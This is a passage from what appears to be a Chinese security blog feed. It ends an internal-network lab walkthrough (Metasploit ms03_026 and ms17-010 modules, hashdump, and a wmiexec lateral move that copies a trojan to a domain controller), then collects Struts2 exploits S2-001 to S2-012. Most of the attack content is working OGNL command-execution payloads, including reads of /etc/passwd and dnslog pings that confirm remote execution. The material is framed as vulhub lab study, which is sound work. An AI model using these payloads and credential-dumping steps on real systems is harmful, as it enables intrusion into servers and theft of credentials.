<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms03-026</span><br><span class="line"></span><br><span class="line">use   exploit/windows/dcerpc/ms03_026_dcom</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost  192.168.52.141</span><br></pre></td></tr></table></figure>



<p>漏洞利用成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" class title="image-20210809175300540">



<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><p>如下获取用户账号和密码hash值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run  post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>



<p>可以看到目标主机的用户账号和密码hash值</p>
<p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" class title="image-20210809175750389">



<p>由于windows2008之前的操作系统密码存储都是以明文形式的，直接加载mimikatz模块后使用wdigest进行抓取</p>
<h4 id="域控主机获取"><a href="#域控主机获取" class="headerlink" title="域控主机获取"></a>域控主机获取</h4><h4 id="漏洞检测利用-1"><a href="#漏洞检测利用-1" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>在之前的信息收集中，得到域控主机开放445和139端口，猜测也有可能存在ms17-010漏洞，对其进行漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/smb/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>检测出来可能存在ms17-010漏洞</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" class title="image-20210810113004761">



<p>然后检测是否是管理员权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>可以看到为管理员账户</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png" class>



<p>使用上面的ms17-010的模块都没有返回管道，建立会话失败</p>
<p>域控主机开放137，139，445端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果开启了137端口（wmi）首先还是建议用wmi , 可以直接利用`auxiliary/scanner/smb/impacket/wmiexec`来代码执行，就可以来开启3389 ，以及配置防火墙等。</span><br><span class="line"></span><br><span class="line">如果开启了`139，445`端口，可以先尝试用exploit/windows/smb/pspexec 来登录，弹正向shell.然后代码执行开启3389，配置防火墙</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</span><br></pre></td></tr></table></figure>



<p>下面使用wmiexec攻击模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  auxiliary/scanner/impacket/wmicexec</span><br><span class="line">set rhost  192.168.52.138</span><br><span class="line">set SMBPass  域控密码</span><br><span class="line">set SMBUser  域控账号</span><br><span class="line">set command  执行的命令</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" class title="image-20210810142402809">



<p>可以看到输入的命令执行成功，这样的话，可以开启远程桌面和使用共享文件将木马复制到域控主机上，然后开启正向shell监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\192.168.52.140\shell\shell.exe C:\1.exe</span><br></pre></td></tr></table></figure>



<p>原理:整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。</p>
<p>当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>内网靶场</category>
      </categories>
      <tags>
        <tag>-内网渗透 -web靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2漏洞集合</title>
    <url>/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="Struts2漏洞集合"><a href="#Struts2漏洞集合" class="headerlink" title="Struts2漏洞集合"></a>Struts2漏洞集合</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Struts 2最初被称为WebWork 2，它是一个简洁的、可扩展的框架，可用于创建企业级Java web应用程序。设计这个框架是为了从构建、部署、到应用程序维护方面来简化整个开发周期。</p>
<p>[TOC]</p>
<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><p>这里总结下关于Struct2的漏洞集合，靶场环境使用vulhub进行搭建。</p>
<h3 id="S2-001-CVE-2007-4556"><a href="#S2-001-CVE-2007-4556" class="headerlink" title="S2-001(CVE-2007-4556)"></a>S2-001(CVE-2007-4556)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Struts 2.0.0 – Struts 2.0.8</p>
<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在登录框中按照%{xxxx}的格式输入测试的表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145120534.png" class title="image-20220309145120534">

<p>点击提交后，表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145221296.png" class title="image-20220309145221296">

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取tomcat执行路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>获取web路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145842935.png" class title="image-20220309145842935">



<p><strong>任意命令执行</strong></p>
<p>其他命令可直接修改new java.lang.String<a href="xxx"></a>函数里面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>执行读取&#x2F;etc&#x2F;passwd文件命令</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309150137162.png" class title="image-20220309150137162">

<h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p>
<p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>

<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
<ul>
<li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li>
<li>S2-003 后官方增加了安全模式（沙盒）</li>
<li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li>
</ul>
<h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.1.8.1</p>
<h4 id="漏洞探测-1"><a href="#漏洞探测-1" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 </span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<p>修改exec()中需执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22pwd%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>



<h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><h4 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。<strong>也就是一般出现在表单处</strong></ActionName></p>
<p>例如这里有一个 UserAction：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>

<p>然后配置有 UserAction-validation.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">validators</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.2.3</p>
<h4 id="漏洞探测-2"><a href="#漏洞探测-2" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153002375.png" class title="image-20220309153002375">

<p>表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153336735.png" class title="image-20220309153336735">

<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<p>修改下面poc中exec()函数id参数执行其他命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>

<p>执行命令<code>id</code>，返回信息</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153524428.png" class title="image-20220309153524428">

<p>返回当前用户root</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153722721.png" class title="image-20220309153722721">

<h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><h4 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
<p>例如在 devMode 模式下直接添加参数<code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）</p>
<h4 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1</p>
<h4 id="漏洞探测-3"><a href="#漏洞探测-3" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22id%22%29)</span><br></pre></td></tr></table></figure>

<p>可以观察到命令已经执行，只是没有回显</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309154647936.png" class title="image-20220309154647936">

<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们需要执行个在Linux上观察到的现象，这里我们使用dnslog解析记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.mkzgrx.dnslog.cn%22%29)</span><br></pre></td></tr></table></figure>

<p>在DNS平台上可观察到解析记录，证明命令执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309155007949.png" class title="image-20220309155007949">

<h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><h4 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\u0023</code>或<code>\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线。但是，如果当前action中接受了某个参数<code>example</code>，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在<code>example</code>参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#</code>、<code>\</code>等特殊字符的防御。</p>
<p>漏洞代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example5Action</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2111967621952300611L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码没有更简单了，其接受了name参数并调用setName将其赋值给私有属性<code>this.name</code>，正是符合我们的要求。然后去<code>WEB-INF/src/java/struts-ajax.xml</code>看一下URL路由：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;ajax&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;example5&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>name=example5</code>，所以访问<code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里，访问该URL</p>
<h4 id="漏洞版本-3"><a href="#漏洞版本-3" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1.1</p>
<h4 id="漏洞探测-4"><a href="#漏洞探测-4" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309160925270.png" class title="image-20220309160925270">



<p>进入容器文件夹查看文件是否创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器名/容器id bash</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161718892.png" class title="image-20220309161718892">



<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20test.w2ypax.dnslog.cn%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<p>设置属性并提交</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161911262.png" class title="image-20220309161911262">

<p>可在dnslog平台上观察到dns记录</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161956916.png" class title="image-20220309161956916">

<h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><h4 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p>
<h4 id="漏洞版本-4"><a href="#漏洞版本-4" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.13</p>
<h4 id="漏洞探测-5"><a href="#漏洞探测-5" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>读取文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>读取文件成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162448665.png" class title="image-20220309162448665">

<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h4 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ping&quot;, &quot;test.gh6gw2.dnslog.cn&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>存在dnslog记录</p>
